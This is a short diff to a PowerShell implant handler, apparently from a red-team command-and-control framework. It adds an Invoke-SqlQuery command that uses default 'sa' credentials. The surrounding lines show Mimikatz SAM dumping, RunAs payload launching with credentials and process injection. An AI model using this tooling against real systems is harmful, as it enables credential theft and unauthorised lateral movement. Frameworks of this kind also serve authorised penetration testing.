@@ -172,6 +172,7 @@ function Implant-Handler
         Write-Host " Get-PassPol" -ForegroundColor Green
         Write-Host " Get-PassNotExp" -ForegroundColor Green
         Write-Host " Get-LocAdm" -ForegroundColor Green
+        Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
         Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
         Write-Host " Invoke-RunAs-Payload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
         Write-Host " Invoke-RunAs-ProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
@@ -653,6 +654,10 @@ $error.clear()
             { 
                 CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                 $pscommand = "Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)"
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
+            { 
+                CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject'))
             { 
